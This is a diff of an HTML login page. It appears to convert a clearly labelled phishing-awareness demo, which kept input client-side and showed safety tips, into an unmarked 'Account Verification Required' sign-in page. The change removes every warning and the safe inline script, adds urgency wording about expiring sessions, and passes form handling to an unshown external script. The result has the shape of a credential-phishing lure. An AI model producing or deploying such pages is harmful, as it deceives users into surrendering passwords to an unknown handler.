@@ -1,54 +1,27 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Acme Secure Portal — Demo</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <title>Secure Account Verification</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <main class="login-card" id="card">
-    <h1>Acme Secure Portal</h1>
 
-    <form id="loginForm" autocomplete="off">
-      <label for="username">Email</label>
-      <input id="username" name="username" type="email" required placeholder="you@example.com" autocomplete="off" />
-      <label for="password">Password</label>
-      <input id="password" name="password" type="password" required placeholder="Password" autocomplete="off" />
-      <button type="submit">Sign in</button>
+  <div class="login-box">
+    <h2>Account Verification Required</h2>
+    <p>Please sign in to continue</p>
+
+    <form id="loginForm">
+      <input type="text" placeholder="Username or Email" required />
+      <input type="password" placeholder="Password" required />
+      <button type="submit">Sign In</button>
     </form>
 
-    <p class="note">This is a static educational demo. Do NOT use real credentials.</p>
-  </main>
+    <p class="note">
+      For security reasons, your session may expire automatically.
+    </p>
+  </div>
 
-  <template id="educational">
-    <main class="login-card">
-      <h1>Simulated Phishing — Awareness</h1>
-      <p>This interaction was part of a phishing simulation demo for testing protection and user awareness.</p>
-      <ul>
-        <li>Never enter real credentials on unexpected pages.</li>
-        <li>Check the URL and TLS (HTTPS + correct domain).</li>
-        <li>Report suspicious messages to your security team.</li>
-      </ul>
-      <p class="note">No credentials were transmitted or stored by this demo.</p>
-    </main>
-  </template>
-
-  <script>
-    // SAFE-BY-DESIGN: This demo never sends data to a server.
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-
-      // Display educational content client-side only.
-      const tpl = document.getElementById('educational');
-      const parent = document.getElementById('card').parentElement;
-      parent.replaceChild(tpl.content.cloneNode(true), document.getElementById('card'));
-      // Make sure we clear any sensitive input values from memory immediately:
-      try {
-        document.getElementById('username').value = '';
-        document.getElementById('password').value = '';
-      } catch (err) {}
-    });
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
